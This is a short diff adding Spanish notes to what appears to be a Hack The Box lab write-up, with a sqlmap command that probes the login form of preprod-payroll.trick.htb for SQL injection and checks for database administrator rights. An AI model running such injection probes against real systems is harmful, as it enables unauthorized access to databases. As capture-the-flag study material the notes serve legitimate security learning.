@@ -13,4 +13,7 @@
 </p>
 
 
-
+Saber que tipo de base de datos tiene 
+```
+sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data="username=abc&password=abc" -p username --is-dba --batch
+```
